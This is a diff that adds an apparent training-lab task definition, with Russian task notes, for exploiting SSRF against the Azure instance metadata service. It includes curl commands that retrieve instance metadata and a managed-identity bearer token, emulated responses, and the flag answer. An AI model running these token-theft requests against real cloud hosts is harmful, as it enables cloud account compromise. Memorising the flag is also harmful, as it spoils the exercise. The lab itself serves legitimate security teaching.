@@ -1,0 +1,42 @@
+{
+  "id": "cloud-azure-managed-identity",
+  "workdir": "/home/student/azmi",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/azmi/found.txt",
+    "contains": "nto{4zur3_m1_1mds}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/azmi",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/azmi/task.md",
+      "text": "# Задача: Azure IMDS\n\nПриложение на VM уязвимо к SSRF и может ходить на `169.254.169.254`. Получи metadata инстанса и токен его managed identity. В тегах инстанса лежит флаг.\n\nИнструмент: `curl` (эмуляция — ответы захвачены с реального Azure IMDS).\n"
+    },
+    {
+      "path": "/home/student/azmi/notes.md",
+      "text": "Заметки\n------\n- IMDS требует заголовок `Metadata: true`, иначе 400.\n- oauth2/token с `resource=` выдаёт bearer-токен для указанного ресурса.\n- Теги инстанса видны в metadata/instance (раздел tags).\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [-s] [-H ...] <url> — HTTP-запрос (эмуляция: ответы захвачены с Azure IMDS)",
+      "cases": [
+        {
+          "match": "metadata/instance",
+          "example": "curl -s -H Metadata:true \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"",
+          "output": "{\n  \"compute\": {\n    \"name\": \"acme-prod-app01\",\n    \"location\": \"germanywestcentral\",\n    \"resourceGroupName\": \"acme-prod-rg\",\n    \"subscriptionId\": \"11112222-3333-4444-5555-666677778888\",\n    \"tagsList\": [\n      {\"name\": \"env\", \"value\": \"prod\"},\n      {\"name\": \"owner\", \"value\": \"platform\"},\n      {\"name\": \"deploy-secret\", \"value\": \"nto{4zur3_m1_1mds}\"}\n    ]\n  }\n}\n"
+        },
+        {
+          "match": "oauth2/token",
+          "example": "curl -s -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01\"",
+          "output": "{\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJvaWQiOiI5ZjJhIn0.sig\",\n  \"client_id\": \"9f2a1b3c-4d5e-6f70-8192-a3b4c5d6e7f8\",\n  \"expires_in\": \"3599\",\n  \"resource\": \"https://management.azure.com/\",\n  \"token_type\": \"Bearer\"\n}\n"
+        }
+      ],
+      "fallback": "curl: (эмуляция) для этого URL нет захваченного ответа. Попробуй:\n  http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01\n"
+    }
+  }
+}
